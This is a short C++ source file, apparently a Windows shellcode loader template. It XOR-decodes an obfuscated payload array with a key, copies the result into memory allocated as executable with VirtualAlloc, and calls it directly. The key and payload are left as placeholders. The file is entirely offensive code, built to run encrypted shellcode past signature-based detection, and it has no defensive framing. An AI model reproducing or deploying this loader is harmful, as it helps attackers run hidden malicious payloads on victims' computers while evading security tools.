#include <iostream>
#include <windows.h>

int main(int argc, char** argv)
{
	const std::string KEY = "<your key goes here>";

	char b[] = { <your obfuscated payload goes here> };
	char c[sizeof(b)] = { 0 };

	for (int i = 0; i < sizeof(b); i++)
	{
		c[i] = b[i] ^ KEY[i % KEY.size()];
	}

	void* exec = VirtualAlloc(0, sizeof(c), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	std::memcpy(exec, c, sizeof(c));

	((void(*)())exec)();

	VirtualFree(exec, 0, MEM_RELEASE);

	return 0;
}
